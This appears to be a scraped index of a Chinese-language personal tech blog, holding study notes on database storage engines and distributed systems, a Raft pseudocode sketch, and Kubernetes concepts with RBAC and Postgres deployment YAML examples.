一直return回去\n用scan去爬每一個node的record Pipelined Scanning call一次給一筆 Materialized Scanning batch處理，放到temp file，一次回傳 丟給上一層做下一步處理 Storage engine 怎麼被存的? (實作OS的hdd與mem管理)\nDatabase: directory Table: file Record: bytes 怎麼與HDD互動? (實作可以跑query的file system)\nBlockId Immutable Identifies a specific logical block A file name + logical block number BlockId blk = new BlockId(\u0026quot;std.tbl\u0026quot;, 23); Page Holds the contents of a block Backed by an I/O buffer in OS Not tied to a specific block Read/write/append an entire block a time Set values are not flushed until write() 怎麼增加從disk拉的速度? 兩個方向 low-level block API Pros 可以直接控制phy層資料的位置 不用管OS的任何限制 Cons 實作十份複雜 沒有portability file system Pros 簡單易用 Cons 無法控制phy層資料的位置 無法控制page filesystem的實作可能把db的正確性破壞掉 只能一直flush 怎麼與mem互動? (實作block的cache)\ncache什麼? user data (DBs, including catalogs) logs (meta-writes) No Virtual Memory!! bad page replacement algorithms OS可能換到不想要的page uncontrolled delayed writes Swapping 無法控制 (should be direct I/O!!) 需要swap的page資訊(meta data) Self-Managed Page Controlled swapping Supports meta-writes Cache Pages Access Pattern Random block reads and writes Concurrent access to multiple blocks Predictable access to certain blocks how to cache? buffer pool: a pool of pages Caching multiple blocks Implement swapping Pool Size 要夠大 (至少所有正在用到的page都要放到pool) 不然會Deadlock detect deadlock 看pin有沒有timeout deal with deadlock 抓一個犧牲者 把他的block全部unpin 之後在慢慢pin回來 如果是一個人pin爆了pool? 只能死亡 (丟例外) 利用Predictable access block Pinning Blocks: 不會被swap出去 流程 pin block 在某個page read 完成就unpin block A block can be pinned multiple times Pinning Pages: Hit cache成功 Swapping page dirty要swap回去 很多page? replacement strategies Waiting 所有人都pin了，所以要等 Buffers = page + page的meta data 例子 現在做pin(60); pin(70); Buffer Replacement Strategies Naïve 只要unpin的就好 hit rate低 buffers are not evenly utilized FIFO 挑read in時間最早的 Assumption: the older blocks are less likely to be used in the future counter: catalog blocks!! LRU 找最早unpin的 Assumption: blocks that are not used in the near past will unlikely be used in the near future Clock 很像Naïve，但是從上次replace的地方開始找 Caching Logs Log用在 ACID的C與I，Write-Ahead-Logging (WAL) commit時 log在tx中做的動作到buffer 要commit時，先把buffer倒到log file 倒完再寫一個完成commit(COMMIT log)的log到log file swap page時 把buffer flush掉 rollback 誰要rollback? 沒有COMMIT log的tx 3 possibilities for each action on disk With log and block 用log去undo，把block改好 With log, but without block 用log去undo，把block改好 Without log and block 不用管 Assumption of WAL each block-write either succeeds or fails entirely on a disk, despite power failure 需要Pool嗎? 不用 log是single buffer Always appends Always sequential backward reads record怎麼存? (linux的fs只有char與block，但現在我們有datatype)\n所有record(a table)都要在同一個file?\nHomogeneous 有利於single-table queries Heterogeneous 有利於需要join的queries 一筆record(row)的所有部分都要在同一個block?\nSpanned 沒有空間浪費 record大小不用受制於block大小 Unspanned 只要讀一個block就是一筆record 所有部分都要緊貼著彼此嗎?\nRow-oriented store Row-by-row Column-oriented store 存成好幾個array Pros \u0026amp; Cons 欄位(datatype)要固定大小嗎?\nFixed-Length Variable-Length 內部block怎麼處理 the record’s length changes delete a record soft delete 刪掉的空間沒辦法用 把space空出來 cannot random access a record in a page =\u0026gt; no position information page layout header放 record總數 free space的終點 指到record的mapping table 改大小的話 要重新找連續的free space 碎片化 VACUUM command 怎麼管理free space (怎麼知道哪裡有free space)\nChaining Meta-Pages Meta-File 每個record的大小? 其他與db有關的訊息放在哪?\ncatalog tables Table metadata table的資訊 (大小、長度\u0026hellip;) View metadata view的訊息 (creater,\u0026hellip;) Index metadata 每個欄位的index in mem Statistical metadata 關於table的統計資訊，可以在plan時使用 Group Communication 分散式計算\nDB Workloads Operational workloads OLTP (On-line Transaction Processing) 跑tx多，執行時間短 Analytic workloads Online (OLAP) or offline 資料分析 Cloud DB SAE high Scalability\n可水平擴展來拉throughput S through partitioning Partition your hot tables horizontally vertically 要處理 分散的 metadata manager query processor (record, plan) transactions Distributed S2PL 看 分散式那一份筆記 的 怎麼commit那一部分 high Availability\n不能死，除了網路、硬體問題外 A through replication Replicate all tables across servers Replication Eager 在ㄌtx commit之前，每台都要完成 strong consistency, slow tx Lazy local先寫，之後再非同步的同步到另一台去 eventual consistency, fast tx Who Writes? Master/Slave write只有某一台處理 read由其他台負責 Multi-Master write每一台都可以負責 Elasticity\n能根據machine與workload去動態調整data分布 Re-Partitioning Data chunking 使用者指定 系統生成 (consistent hashing) Master server for load monitoring Migrate Migration with Determinism 做一個空的replica 在兩個db上跑同一個tx，只拉用到的data (Foreground Pushing) 剩下就是非同步的推 (Background Pushing) Migration vs. Crabbing Client served by any node running faster Migration delay imperceptible 我同時serve，我同時migrate SAE + 完整的retional DB基本上不可能 Workarounds No expressive model 在應用層處理(dirty work) No flexible queries 多發幾個query或是繼續在應用層處理(dirty work) No tx and ACID 在應用層處理 Ref nthu-datalab/db\n","permalink":"https://littlebees.github.io/2022/01/database-system/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我之前學的DB根本就是假的\n這是來自nthu的DB課程，有slide但沒有prjects\u003c/p\u003e\n\u003cp\u003e難道之後要跑CMU 15-445嗎?\n不過有一說一，DB越看與xv6的fs真的很像，除了沒有SQL的部分\u003c/p\u003e","title":"database system"},{"content":"動機 論選好課、書的重要性\nModels of distributed systems 怎麼處理上面會騙人的狀況? 只有兩人無法判斷對錯，所以如果有一個壞人，就要有兩個好人，才能抵銷\n剛剛的兩個問題都有兩項東西\nNode Network 還有另一個要考慮的是 latency!!\nsystem model是由下面3項組成\nNetwork behaviour (e.g. message loss) (assume) bidirectional point-to-point communication Reliable (perfect) links 如果收到msg，就代表他有被送出 可能重排 Fair-loss links + retry\u0026amp;消除重複 Fair-loss links msg可能消失、重複、重排 但一直try總會到對面去 Arbitrary links + TLS Arbitrary links 中間有不懷好意的人 Network partition 線路會drop或是delay Node behaviour (e.g. crashes) 如果出事(faulty)的話 Crash-stop (fail-stop) crash就直接停下來 Crash-recovery (fail-recovery) crash會失去mem中的狀態 在一段時間之後會自己復原 Byzantine (fail-arbitrary) crash後什麼事都有可能發生 Timing behaviour (e.g. latency) Node \u0026amp; Network Synchronous latency有上限 node的執行速度是可以預估的 Partially synchronous 有些部分是async的(會結束，但不知道多久) 其他都是sync Asynchronous latency不確定 node也不確定會不會隨時停下 Node的意外 Operating system scheduling (priority inversion) Stop-the-world garbage collection Page faults, swap, thrashing Network的意外 Message loss requiring retry Congestion/contention causing queueing Network/route reconfiguration Failure: system完全不動\nFault: 一部份不動了\nnode crash (crash-stop/crash-recovery) deviating from algorithm (Byzantine) Network dropping or significantly delaying messages Failure detectors\nPerfect failure detector labels a node as faulty iff it has crashed Typical implementation send message await response label node as crashed if no reply within some timeout Problem 不能區分是 crashed node temporarily unresponsive node lost message delayed message 所以只能在 synchronous crash-stop system with reliable links Eventually perfect failure detector temporarily 標成 crashed, 就算是 correct 標成 correct, 就算是 crashed eventually 標成 crashed, iff crashed Time, clocks, and ordering of events two types of clock physical clocks 就是時間，數花掉的時間 會有誤差 (可能在調整時變大變小) Coordinated Universal Time (UTC) UTC 是由 TAI 配合地球自轉速度做修正 International Atomic Time(TAI): from 原子鐘 地球自轉速度不是常數 Leap seconds 在 on 30 June and 31 December at 23:59:59 UTC negative leap second: 直接跳過去 positive leap second: 跳到 23:59:60等1秒，再跳過去 timestamps格式 Unix time: number of seconds since 1 January 1970 00:00:00 UTC 不算Leap seconds ISO 8601: year, month, day, hour, minute, second, and timezone offset relative to UTC 2020-11-09T09:50:17+00:00 NTP Clock skew: 兩個clock的差 作法 對多台server取樣，跑算式\n開始調時間\nTime-of-day clock 從某個時間點開始 適合比較 可能會變動 (NTP矯正) Monotonic clock 隨便一個點開始 適合計算花費的時間 logical clocks 用來數有多少事件 單調遞增 happens-before relation (就是有向圖的path) 定義 同一個process a發生在b之前 不同process a送msg，b收到 遞移律 a -\u0026gt; b -\u0026gt; c: a -\u0026gt; c 就是有向圖的path partial order concurrent: 不是 a -\u0026gt; b 或 b -\u0026gt; a a || b Causality concurrent代表兩者一定沒有因果關係 有hb就是可能有因果關係 定義 a strict total order on events Broadcast protocols and logical time capture causal dependencies\nNo Physical timestamps!! two types of logical clocks Lamport clocks 作法 每個process init自己的時間 t = 0 有event發生 t++ send某個m t++ send((t, m)) recv到某個(tx, m) t = max(tx, t) + 1 對m做事 Properties L是取t的函數、N是取在哪個process的函數 the pair (L(e), N(e)) uniquely identifies event e 用Lamport clocks定義total order BUT 不同process的timestamp可能會一樣!! 不能分辨 a -\u0026gt; b 或是 a || b 因為把自己與其他人的時間混在一起了 Vector clocks 作法 每個process(假設叫i) init自己的時間 t = [0] * len(procs) 有event發生 t[i]++ send某個m t[i]++ send((t, m)) recv到某個(tx, m) t = [max(t[j], tx[j]) if j != i else t[i]+1 for j in range(len(procs))] 對m做事 用Vector clocks定義total order Broadcast protocols\nbroadcast的種類 FIFO 從同一個process出來的msg，收到msg的順序，與送的順序一樣 vaild order: (m1一定在m3前面，其他隨便) (m2, m1, m3) (m1, m2, m3) (m1, m3, m2) Causal broadcast(m1) -\u0026gt; broadcast(m2)，那m1一定先收到，之後才是m2 vaild order: (m1 -\u0026gt; m2，m1 -\u0026gt; m3) (m1, m2, m3) (m1, m3, m2) Total order 只要m1先收到，在所有process都會是m1先收到 vaild order: (m1, m2, m3) vaild order: (m1, m3, m2) FIFO-total order FIFO + Total order Broadcast algorithms 要處理兩個部分 把best-effort broadcast變成reliable 利用retransmitting 保持送(收)的順序 Not Reliable (Naive) 直接送到process去 Problem 送的process中間掛掉怎麼辦 Reliable Eager reliable broadcast process只要是第一次收到時就re-boardcast!! 到所有process Problem 總共有O(n^2)個msg在流動!! Gossip protocols process只要是第一次收到時就re-boardcast!! 到3個process (隨機選) 適合用在process很多時 Problem Eventually reaches all nodes (with high probability) FIFO broadcast algorithm 重點是在buffer中找有對到自己的delivered的msg才做下一步動作 這樣就是FIFO，從同一個process出來的msg的順序是對的 Causal broadcast algorithm 延伸FIFO broadcast algorithm，但 改成vector clock!! (這樣就完成CO了!!) Total order broadcast algorithms Single leader (轉成BFS tree) 會有單點失敗!! Lamport clocks (用Lamport clocks排序) 怎麼確定我現在拿到的msg是最小的? 要等到每個process的msg的stamp都比較大才會知道 Replication Use best-effort broadcast Idempotence\n多次操作後不用dedup的操作 retry behaviour At-most-once 不retry At-least-once Retry到收到ack Exactly-once Retry + idempotence deduplication 就算是idempotence，還是有影響到狀態 所以下面的client2到了最後沒辦法看到移除了client1 add的資料的狀態 Timestamps and tombstones (soft delete)\n資料會放一個flag，標有沒有被刪過\nReconciling replicas\n還會放一個timestamp標什麼時候被寫入 Concurrent writes by different clients\n兩種做法 Last writer wins 取timestamp最大的 total order (e.g. Lamport clock) 注意 data loss Multi-value register 如果可以比，取最大；不能比，都存 partial order (e.g. vector clock) Quorum (Byzantine problem)\nRead-after-write consistency 只要read(read quorum)/write(write quorum)的response有到達指定人數就取這個結果 read quorum + write quorum \u0026gt; nodes 一般取，(nodes+1)/2 可以在write時忍受nodes-write quorum壞掉，read是nodes-read quorum Use Total order broadcast (在每個process中msg的順序都是一樣的!!) State machine replication FIFO total order broadcast送update msg: 一定會到、順序一樣 能不能用更弱的broadcast 這樣就沒有順序的保證了!! 但是update的順序如果不影響最後的結果的話 commutative: f(g(x)) = g(f(x)) 所以可以把update msg當成map，Replica當成DFA same input, same output: deterministic 限制 不能馬上更新，要等msg傳遞 需要 fault-tolerant total order broadcast Consensus Fault-tolerant total order broadcast total order broadcast一定要leader!! leader壞了怎麼辦? 自己選一個 用failure detector (timeout)看leader壞了沒 壞了就選下一個 確保只有一個leader 用term區份這個任期中誰是該區市民與leader 需要定義Quorum (過 半+1) 每個process在每個任期中最多只能投一次票 這樣可以確保一個任期只有一個leader leader在傳msg之前都要ack，不然怕場面尷尬 Consensus and total order broadcast Consensus: 大家都同意某一個值 total order broadcast: 大家都同意下一個msg要送什麼 Consensus and total order broadcast are formally equivalent Common consensus algorithms: Paxos, Multi-Paxos, Raft Distributed mutual exclusion 作法 central lock server leader是bottleneck 單點失敗 怎麼重選leader token passing 用一個token去傳(整個要連成一個ring)，拿到就當成拿到lock 單點失敗 怎麼rebuild ring 怎麼重生token Totally ordered multicast 只有一個人held，所以讓所有人投票，要拿到N-1 raft是(N+1)/2 concurrent requests (兩個以上want lock) 看pid比大小 哲學家用餐問題!! Consensus system models 假設system model是 partially synchronous not asynchronous (FLP result) in an asynchronous crash-stop system model no deterministic consensus algorithm that is guaranteed to terminate use clocks only used for timeouts/failure detector to ensure progress not Safety (correctness) crash-recovery Raft state(腳色) 變化 元件 log: leader傳過的msg 或是 follower收到的msg (array) msg term: 傳msg當時的term term: 任期 主要是看這個 sentLength: leader傳了多長的log給follower ackedLength: follower回報他們的log多長 commitLength: 真的有deliver的有多少 class Node: def __init__(self): self.init_runtime_state() self.Term = 0 self.votedFor = None self.log = [] self.commitLength = 0 self.id = \u0026#34;whatever\u0026#34; def init_runtime_state(self): self.Role = \u0026#34;follower\u0026#34; self.Leader = None self.votesReceived = set() self.sentLength = [0]*len(nodes) self.ackedLength = [0]*len(nodes) def when_leader_fail_OR_election_timeout(self): self.Term += 1 self.Role = \u0026#34;candidate\u0026#34; self.votedFor = self.id self.votesReceived.add(self.id) lastTerm = self.log[-1].term if len(self.log) \u0026gt; 0 else 0 for n in nodes: __send(n, (\u0026#34;VoteRequest\u0026#34;, self.id, self.Term, len(self.log), lastTerm)) __startElectionTimer() def when_recv_VoteRequest(self, cId, cTerm, CLogLen, cLogTerm): myLogTerm = self.log[-1].term isLargeLogTerm = cLogTerm \u0026gt; myLogTerm inSameLogTerm = myLogTerm == myLogTerm hasMoreLog = CLogLen \u0026gt;= len(self.log) logOK = isLargeLogTerm or (inSameLogTerm and hasMoreLog) isLargeTerm = cTerm \u0026gt; self.Term inSameTerm = cTerm == self.Term notVoted_OR_voteSame = self.votedFor in {cId, None} termOK = isLargeTerm or (inSameTerm and notVoted_OR_voteSame) if logOK and termOK: self.Term, self.Role, self.votedFor = cTerm, \u0026#34;follower\u0026#34;, cId __send(cId, (\u0026#34;VoteResponse\u0026#34;, self.id, self.Term, True)) else: __send(cId, (\u0026#34;VoteResponse\u0026#34;, self.id, self.Term, False)) def when_recv_VoteResponse(self, vId, vTerm, isAgree): if self.Role == \u0026#34;candidate\u0026#34; and self.Term == vTerm and isAgree: self.votesReceived.add(vId) if len(self.votesReceived) \u0026gt;= (len(nodes)+1)//2: self.Role, self.Leader = \u0026#34;leader\u0026#34;, self.id __stopElectionTimer() for n in {n in nodes if n is not self}: self.sentLength[n], self.ackedLength[n] = len(self.log), 0 self.copyLogTo(n) elif vTerm \u0026gt; self.term: self.Role, self.Term, self.votedFor = \u0026#34;follower\u0026#34;, vTerm, None __stopElectionTimer() def broadcast(self, msg): if self.Role == \u0026#34;leader\u0026#34;: self.log.append((msg, self.Term)) self.ackedLength[self.id] = len(self.log) for n in {n in nodes if n is not self}: self.copyLogTo(n) else: __forwarding_to_leader(msg) def periodically_do(self): if self.Role == \u0026#34;leader\u0026#34;: for n in {n in nodes if n is not self}: self.copyLogTo(n) def copyLogTo(self, n): i = self.sentLength[n] diffLogs = self.log[i:] prevFollowerTerm = self.log[max(0, i-1)] __send(n, (\u0026#34;LogRequest\u0026#34;, self.id, self.Term, i, prevFollowerTerm, self.commitLength, diffLogs)) def when_recv_LogRequest(self, lId, lTerm, followerLogStart, followerLogTerm, lCommitLen, diffLogs): isLargeTerm = lTerm \u0026gt; self.Term isCandidate = lTerm == self.Term and self.Role == \u0026#34;candidate\u0026#34; if isLargeTerm or isCandidate: self.Role, self.Leader = \u0026#34;follower\u0026#34;, lId if isCandidate: self.Term, self.votedFor = lTerm, None largerLog = len(self.log) \u0026gt;= followerLogStart # follower不能比較大，不然就沒有更新的意義了 isFreshStart = followerLogStart == 0 isLogStartInSameTerm = followerLogTerm == self.log[followerLogStart-1].term logOK = largerLog and (isFreshStart or isLogStartInSameTerm) if self.Term == lTerm and logOK: self.patchDiff(followerLogStart, lCommitLen, diffLogs) ack = len(diffLogs) + followerLogStart __send(lId, (\u0026#34;LogResponse\u0026#34;, self.id, self.Term, ack, True)) else: __send(lId, (\u0026#34;LogResponse\u0026#34;, self.id, self.Term, 0, False)) def patchDiff(self, start, lCommitLen, diff): #shrink log if diff and len(self.log) \u0026gt; start and self.log[start].term != diff[0].term: self.log = self.log[:start] if start+len(diff) \u0026gt; len(self.log): self.log += diff[len(self.log)-start:] if lCommitLen \u0026gt; self.commitLength: for msg,_ in self.log[self.commitLength:lCommitLen]: __deliver(msg) self.commitLength = lCommitLen def when_recv_LogResponse(self, fId, fTerm, ack, good): if self.Term == fTerm and self.Role == \u0026#34;leader\u0026#34;: if good and ack \u0026gt;= self.ackedLength[fId]: self.sentLength[fId] = self.ackedLength[Utils, CId] = ack self.commitLogEntries() elif self.sentLength[fId] \u0026gt; 0: # 太長啦 self.sentLength[fId] -= 1 self.copyLogTo(fId) elif fTerm \u0026gt; self.Term: self.Term, self.Role, self.votedFor = fTerm, \u0026#34;follower\u0026#34;, None def commitLogEntries(self): acks = lambda l: len(n for n in nodes if self.ackedLength[n] \u0026gt;= l) newCommitLen = max({l for l in range(1,len(self.log+1)) if acks(l) \u0026gt;= (len(nodes)+1)//2}, default=-1) if newCommitLen \u0026gt; self.commitLength and self.log[newCommitLen-1].term == self.Term: for msg,_ in self.log[self.commitLength:newCommitLen]: __deliver(msg) self.commitLength = newCommitLen Replica consistency 各種情境下的Consistency ACID DB在跑完transaction後會從consistent state到另一個consistent state consistent: satisfying application-specific invariants Read-after-write consistency Replication: 每個replica都要consistent 同樣狀態? 從什麼時候開始算 read都要return一樣的結果 Atomic commit ACID的transaction是 either commits or aborts commit: 是持久的(後面都看的到) abort: 沒有可見的side-effect 所以如果很多DB，也是either commits or aborts Two-phase commit 如果process在等coordinator回commit或是abort之前掛了? 就是等coordinator回來 Fault-tolerant two-phase commit 就是傳commit時會帶所有有關的replica 這樣只要有人發現在有關的replica掛了就可以發abort total order broadcast 之後就是等return ok 都ok，commit 出事，abort Linearizability (strong consistency) 多node的atomic operation 每個operation的return都是最新的結果 not happens-before set之後的get都要能看到set的結果 (Linearizability) client1與client2沒有send/recv (not happens-before) 所以不能用Lamport clocks!! 只能用phy clock!! Operations overlapping in time order沒差，這裡的重點是看的到 Serializability \u0026amp; Linearizability Linearizability: 都拿到最新的結果 (cache coherense) Serializability: 多個transaction同時跑就像是transaction按照某個順序去跑 (mem model) client2與client3拿到的結果不對 (not Linearizability)!! 手法 get的linearizability quorum read set的linearizability blind write to quorum Linearizable compare-and-swap (CAS) total order broadcast advantages 分散式不像分散式 使用上就變簡單了 Downsides Performance: 很多msg與一直在等 Scalability: 需要leader Availability: 連不到quorum什麼事都不用做 Eventual consistency The CAP theorem 在網路會gg的情況下 (network Partition)，只能保證一個 Consistent (linearizable) 等 Available 不等，直接傳自己的舊資料 只要沒有進一步的update，所有replica都會變成一樣的state Strong eventual consistency Convergence: 只要是同一個state跑同一集合的update(order沒差)，最後會是一樣的狀態 Eventual delivery: 只要有人被update到，最後所有人都會被update到 Properties 不用等 只要Causal broadcast或以下就可以update Concurrent updates =\u0026gt; 只要能處理conflict就沒事 Concurrency control in applications (152) Conflicts due to concurrent updates\n解法 Conflict-free Replicated Data Types (CRDTs)\n就是有timestamp的dict 作法 Operation-based 傳的是action (set) reliable broadcast (一定要到，但可以是任何順序) action(set)一定要commutative typically has smaller messages 例子: Operation-based text CRDT init \u0026amp; read elementAt就是array[i]，實作在set上 有一段區間，insert就是二分 delete就是把tuple從state中去掉 causal broadcast insert要在delete之前先到 State-based 傳的是state (整個values) best-effort broadcast (不到沒關係) 原本reliable確保一定會到，但現在沒有 Idempotent 剩下就是原本reliable的事 Commutative 不過現在一次多個 (opration based是一次兩個) Associative can tolerate message loss/duplication Operational Transformation (OT)\n把operation記錄下來，之後需要重組可以重新組合 Consistent snapshots\n前面做的事(包含transcation)，後面(包含transcation)看的到 consistent with causality transcation都要consistent with causality linearizability depends on real-time order 把誤差補上 作法: multi-version concurrency control (MVCC) 每一次write都會產生新的版本與相對應的timestamp read-only transcation就是一個時間 read時就是取比自己早且最靠近自己的資料 snapshot of system-wide state\nConsistent cuts 區分event的cut 在cut中的event都是happens-before 除了起點:-)，所以是consistent 也就是，在左手邊的event只有兩種 send recv，同時他的send也在cut(左手邊)中 f只有recv，沒有send在cut中，就不是consistent 收集snapshot of system-wide state 把Consistent cut推到的地方才收集local state local state之後可以集合起來變成global state 怎麼代表cut? 用marker msg以causal order去發 收到marker就收集state 但是當初收到marker的channel不用 因為前一個process已經收集過了 Ref Linearizability versus Serializability Distributed Systems (好地方，如果slide不懂還有lecture note) Lecture 13: Vector clocks, consistent cuts, process groups, and distributed mutual exclusion\n","permalink":"https://littlebees.github.io/2022/01/distributed-computing/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e論選好課、書的重要性\u003c/p\u003e","title":"Distributed computing"},{"content":"動機 可以先去看k8s筆記\nk8s cluster \u0026amp; namespace namespace == virtual cluster cluster = master + workers k8s Volume StorageClass\na set of disk partitions (a physical disk) provisioner (What is this disk?) parameters =\u0026gt; PersistentVolume a disk partition =\u0026gt; PersistentVolumeClaim a folder with some limitation size What should k8s do when this pod has been deleted? common arguments\nreclaimPolicy accessModes k8s components ConfigMap \u0026amp; Secret dict (key-value) dict[key] = value Serect will encrypt!! ConfigMap will not dict[key] valueFrom configMapKeyRef or secretKeyRef name key DaemonSet run pods on each nodes pods are daemons for a node 每個Pods都會共用同一個掛載硬碟 no rollback 更新方面，DaemonSet更新方式為一個Pod先關閉，而後才起新的Pod StatefulSets pod有唯一編號 使用PVC時，會有各自獨立的Storage 佈署與擴展時，每個 pod 的產生都是有其順序且逐一完成 no rollback Job pods will be cleaned up after pods\u0026rsquo; tasks have finished Ingress \u0026amp; Service Ingress: reverse proxy (url to service) Service: port forward \u0026amp; DNS (url) LoadBalancer routing (like reverse proxy, ip\u0026amp;port to pods) NodePort port forward Deployment -\u0026gt; ReplicaSet -\u0026gt; Pod Health Check Rollback 每個Pods都會共用同一個掛載硬碟 k8s components management how to find a component fulfilling requests? kind other arguments label key:value namespace selector key: value chain service -\u0026gt; deployment(s) (with configmap) -\u0026gt; service -\u0026gt; \u0026hellip;\nk8s \u0026amp; Istio (define how to connect to pods!!) k8s: proxy on Node dispatch(by iptables) to pods in this Node istio proxy on Service (in each pod) like Ingress, but proxy control pods directly 可以實現內對外的gateway () 這裡可以順便嘴一下，k8s的pod創完後就不能加pod，所以如果conntainer出事沒辦法插入probe，這樣與kprobe有什麼不一樣(所以才有像是istio之類的東西出現) issue\nhelm yaml compiler \u0026amp; dict manager (control content by some conditions) with some artifacts (reuse others\u0026rsquo; yaml) DSL (no!!) k8s\u0026rsquo;s device plugin 就是driver in traditional OS 用法就是把device mount到對應的path (/dev/xxx) Interface Container Runtime Interface (CRI) (k8s\u0026amp;istio , docker\u0026amp;containerd) Pod Life Cycle (Add/Delete) Pod Status Image management Container Operations (attatch/exec) Container Network Interface (CNI) 上網能力，通常都會希望能夠有連接外網的能力 mutilcast 硬體加速 (DPDK,\u0026hellip;) 但k8s的proxy與相關功能(service discovery)都是走linux network stack!! CNI要重新實現k8s的proxy與相關功能!! 分配 IP 地址，幫每個 Pod 找一個獨立不重複的 IP Network Policy， kubernetes 內部有 Network Policy 去限制 Pod 與 Pod 之間的網路傳輸 Container Storage Interface(CSI) 支援動態配置或是靜態配置 其實對應到 k8s 就是 storageclass 以及 PersistentVolume 的概念 支援Attach，該 Node 有能力可以跟該儲存方案連接起來 支援Mount，該儲存空間給實體化後可以透過 Filesystem 去存取。 支援 Block Device (EBS) 或是可直接 Mountable Volumes (大家應該大部分都用這個) 支援本地儲存設備解決方案，譬如 (device mapper, lvm)，這些又是以前的儲存議題了 支援創建/刪除快照 可提供從先前創造的快照復原出任何空間 CreateVolume +------------+ DeleteVolume +-------------\u0026gt;| CREATED +--------------+ | +---+----+---+ | | Controller | | Controller v +++ Publish | | Unpublish +++ |X| Volume | | Volume | | +-+ +---v----+---+ +-+ | NODE_READY | +---+----^---+ Node | | Node Stage | | Unstage Volume | | Volume +---v----+---+ | VOL_READY | +------------+ Node | | Node Publish | | Unpublish Volume | | Volume +---v----+---+ | PUBLISHED | +------------+ rdac Role, ClusterRole 就是能使用什麼資源 RoleBinding就是把Role連到User或是ServiceAccount\n這樣pod就能根據rbac的規定去操作k8s的資源，是根據餵到master的token去查權限\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep ACCOUNT | awk \u0026#39;{print $1}\u0026#39;) 下面是針對gitlab ci runner的rbac\nkind: ServiceAccount apiVersion: v1 metadata: name: ci namespace: ci --- kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: ci rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;,\u0026#34;delete\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/binding\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/log\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/status\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;] - apiGroups: [\u0026#34;apps\u0026#34;] resources: [\u0026#34;deployments\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;] - apiGroups: [\u0026#34;apps\u0026#34;] resources: [\u0026#34;replicasets\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;secrets\u0026#34;] verbs: [\u0026#34;list\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;update\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;configmaps\u0026#34;] verbs: [\u0026#34;list\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;update\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/exec\u0026#34;] verbs: [\u0026#34;create\u0026#34;] - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods/attach\u0026#34;] verbs: [\u0026#34;list\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;delete\u0026#34;, \u0026#34;update\u0026#34;] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: ci subjects: - kind: ServiceAccount name: ci namespace: ci roleRef: kind: ClusterRole name: ci apiGroup: rbac.authorization.k8s.io --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: ci-default subjects: - kind: ServiceAccount name: default namespace: ci roleRef: kind: ClusterRole name: ci apiGroup: rbac.authorization.k8s.io 多nodes 創master: kubeadm init 拿master的token: kubeadm token list join: kubeadm join --discovery-token-unsafe-skip-ca-verification --token=TOKEN MASTER_IP:6443 kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk \u0026#39;{print $1}\u0026#39;) 範例 下面是用Secret, ConfigMap, Service, Deployment 簡單創一個DB\napiVersion: v1 kind: Secret metadata: name: postgres-secret type: Opaque data: POSTGRES_PASSWORD: MTIzNDU2Nzg5Cg== --- apiVersion: v1 kind: ConfigMap metadata: name: postgres-config labels: app: postgres data: POSTGRES_COMMON: pg2 POSTGRES_PASSWORD: \u0026#34;123456789\u0026#34; --- apiVersion: v1 kind: PersistentVolume metadata: name: postgres-pv-volume labels: type: local app: postgres spec: storageClassName: manual capacity: storage: 5Gi accessModes: - ReadWriteMany hostPath: path: \u0026#34;/mnt/data\u0026#34; --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: postgres-pv-claim labels: app: postgres spec: storageClassName: manual accessModes: - ReadWriteMany resources: requests: storage: 1Gi --- apiVersion: apps/v1 kind: Deployment metadata: name: postgres spec: replicas: 1 selector: matchLabels: app: postgres template: metadata: labels: app: postgres spec: containers: - name: postgres image: postgres:12.9-alpine imagePullPolicy: \u0026#34;IfNotPresent\u0026#34; ports: - containerPort: 5432 env: - name: POSTGRES_DB valueFrom: configMapKeyRef: name: postgres-config key: POSTGRES_COMMON - name: POSTGRES_USER valueFrom: configMapKeyRef: name: postgres-config key: POSTGRES_COMMON - name: POSTGRES_PASSWORD valueFrom: secretKeyRef: name: postgres-secret key: POSTGRES_PASSWORD volumeMounts: - mountPath: /var/lib/postgresql/data name: postgredb volumes: - name: postgredb persistentVolumeClaim: claimName: postgres-pv-claim --- apiVersion: v1 kind: Service metadata: name: postgres labels: app: postgres spec: 